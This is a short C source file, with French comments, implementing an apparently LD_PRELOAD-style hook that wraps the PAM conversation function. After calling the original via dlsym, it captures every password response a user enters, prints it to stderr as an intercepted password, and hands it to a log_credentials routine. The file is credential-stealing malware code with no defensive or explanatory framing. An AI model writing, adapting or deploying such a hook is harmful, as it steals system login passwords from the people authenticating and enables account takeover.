#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include "utils.h"

static int (*real_pam_conv)(int, const struct pam_message **,
                            struct pam_response **, void *) = NULL;

int pam_conv(int n, const struct pam_message **msg,
             struct pam_response **resp, void *appdata_ptr)
{
    // Charger la fonction pam_conv originale
    if (!real_pam_conv) {
        real_pam_conv = dlsym(RTLD_NEXT, "pam_conv");
        if (!real_pam_conv) {
            fprintf(stderr, "[hook_pam] Impossible de charger pam_conv.\n");
            return PAM_CONV_ERR;
        }
    }

    // Appel de la fonction originale
    int ret = real_pam_conv(n, msg, resp, appdata_ptr);

    if (ret == PAM_SUCCESS && resp && *resp) {
        // *resp est le tableau de struct pam_response
        for (int i = 0; i < n; i++) {
            if ((*resp)[i].resp) {
                fprintf(stderr, "[hook_pam] Interception du mot de passe : %s\n", (*resp)[i].resp);
                log_credentials((*resp)[i].resp);
            }
        }
    }

    return ret;
}
